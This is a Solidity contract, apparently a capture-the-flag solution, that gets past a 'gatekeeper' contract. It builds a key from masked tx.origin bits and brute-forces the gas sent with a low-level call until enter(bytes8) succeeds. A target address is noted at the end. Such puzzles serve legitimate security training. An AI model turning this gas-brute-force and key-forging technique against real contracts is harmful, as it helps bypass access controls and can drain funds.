//SPDX-License-Identifier:MIT;
pragma solidity ^0.6.0;
contract GatePassOne {
    event Entered(bool success);

    function enterGate(address _gateAddr, uint256 _gas) public returns (bool) {
        bytes8 key = bytes8(uint64(tx.origin)) & 0xffffffff0000ffff;

        bool succeeded = false;

        for (uint i = _gas - 64; i < _gas + 64; i++) {
          (bool success, ) = address(_gateAddr).call.gas(i)(abi.encodeWithSignature("enter(bytes8)", key));
          if (success) {
            succeeded = success;
            break;
          }
        }

        emit Entered(succeeded);

        return succeeded;
    }
}
//0x82c561d4961309d15E4C2b163F4a04f3A83b2C28, 65782